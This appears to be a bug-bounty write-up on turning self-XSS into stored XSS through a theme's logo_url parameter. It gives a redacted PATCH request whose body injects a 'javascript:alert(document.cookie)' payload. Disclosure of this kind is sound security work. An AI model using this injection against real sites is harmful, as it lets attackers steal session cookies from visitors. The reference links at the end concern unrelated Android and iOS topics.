---
title: "Turning Self-XSS to Stored XSS"
layout: post
---

# Introduction
2020-05-13
<br />

While I was recently hunting on a promising web target, I discovered persistent XSS in the target. 
<br />

## Impact:

An attacker can use an XSS to perform many different things such as stealing a session cookie, logging keystrokes, or performing actions as the victim user to name a few. Because this is a stored XSS a user does not have to be tricked into clicking on a link or otherwise manipulated to trigger the payload they simply need to browse to the area or click application button that is affected.

## Vulnerability:

The vulnerability exists in the theme section which allows the user logo uploading. Logo upload progress is completed through 3rd party framework.

### Proof Of Concept

I changed logo_url parameter via sample XSS payload.

{% highlight html %}

PATCH /**/theme HTTP/1.1
Host: ***
User-Agent: ***
Accept: application/json, text/plain, */*
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Requested-With: XMLHttpRequest
X-CSRFToken: ***
Content-Length: 52
Origin: ***
Connection: close
Referer: ***
Cookie: ***


{"logo_url":"javascript:alert(document.cookie)"}
{% endhighlight %}



## Conclusion

With the change of parameter with a malicious one, XSS is triggered for every person who visited the web-site. 

[1]: https://github.com/b-mueller/frida-detection-demo
[2]: https://d3adend.org/blog/posts/android-anti-hooking-techniques-in-java/
[3]: https://github.com/leenjewel/openssl_for_ios_and_android

